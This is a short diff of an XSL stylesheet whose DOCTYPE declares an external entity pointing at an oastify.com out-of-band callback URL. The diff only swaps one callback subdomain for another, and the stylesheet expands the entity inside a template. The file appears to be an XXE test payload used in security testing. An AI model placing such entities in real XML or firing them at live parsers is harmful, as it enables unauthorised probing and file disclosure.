@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "https://bfun895bq795agtw39k7fy2vvm1dp5ht6.oastify.com/test">]>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "https://p0qbn5vta3tatj26f3ifjy2ax13srlfa.oastify.com/test">]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
     &ext_file;
